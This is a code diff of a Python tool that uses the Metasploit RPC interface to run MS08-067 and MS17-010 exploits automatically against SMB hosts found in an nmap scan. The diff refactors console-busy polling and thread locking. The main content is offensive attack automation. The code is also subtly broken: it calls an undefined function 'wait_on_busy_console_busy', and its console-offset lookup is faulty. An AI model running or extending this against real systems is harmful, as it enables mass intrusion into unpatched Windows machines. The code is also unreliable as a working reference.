@@ -39,12 +39,11 @@ def print_good(msg):
 def print_great(msg):
     print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))
 
-def keep_alive(args):
+def keep_alive(args, lock):
     '''
     msfrpc will kill auth tokens after 5m
     '''
     global CLIENT
-    lock = Lock()
 
     last_check = time.time()
     while True:
@@ -227,44 +226,51 @@ def create_msf_cmd(exploit_path, rhost_var, ip, port, extra_opts):
 
     return cmds
 
+def wait_on_busy_console(c_id):
+    '''
+    The only way to get console busy status is through console.read or console.list
+    console.read clears the output buffer so you gotta use console.list
+    but console.list requires you know the list offset of the c_id console
+    so this ridiculous list comprehension seems necessary to avoid assuming
+    what the right list offset might be
+    '''
+    list_offset = [x['id'] for x in CLIENT.call('console.list')['consoles'] if x['id'] is c_id][0]
+    while CLIENT.call('console.list')[list_offset]['busy'] == True:
+        time.sleep(1)
+
 def exploit_smb(c_id, smb_vuln_hosts):
     '''
     Exploits ms08-067 and ms17-010
     '''
     ms17_cmds, ms08_cmds = get_smb_cmds(smb_vuln_hosts)
+
     if len(ms17_cmds) > 0:
         for cmd in ms17_cmds:
-
-            # Make sure the console is not busy
-            while CLIENT.call('console.read', [c_id])['busy'] == True:
-                time.sleep(1)
-
+            wait_on_busy_console_busy(c_id)
             CLIENT.call('console.write',[c_id, cmd])
 
     if len(ms08_cmds) > 0:
         for cmd in ms08_cmds:
-
-            # Make sure the console is not busy
-            while CLIENT.call('console.read', [c_id])['busy'] == True:
-                time.sleep(1)
-
+            wait_on_busy_console(c_id)
             CLIENT.call('console.write',[c_id, cmd])
 
 def main(report, args):
     global CLIENT
 
+    lock = Lock()
+
     # hosts will only be populated with ips that have open ports
     # hosts = {ip : [(port, banner), (port2, banner2)]
     hosts = get_hosts(report)
 
-    # these are in format {ip:[ms08-nse, ms17-nse]}
-    smb_vuln_hosts = get_smb_vuln_hosts(report)
-
     # initialize keep alive process
-    p = Thread(target=keep_alive, args=(args,))
+    # won't attempt first login until 100s from start
+    p = Thread(target=keep_alive, args=(args, lock))
+    p.setDaemon(True)
     p.start()
 
     CLIENT.login(args.username, args.password)
+
     c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
 
     if len(c_ids) == 0:
@@ -275,6 +281,8 @@ def main(report, args):
     c_id = c_ids[-1]
 
     #Exploit ms08/17
+    # these are in format {ip:[ms08-nse, ms17-nse]}
+    smb_vuln_hosts = get_smb_vuln_hosts(report)
     exploit_smb(c_id, smb_vuln_hosts)
 
     embed()
@@ -286,3 +294,6 @@ if __name__ == "__main__":
         sys.exit()
     report = parse_nmap(args)
     main(report, args)
+
+#TODO
+# implement payload search via module.payload rather than manually setting them
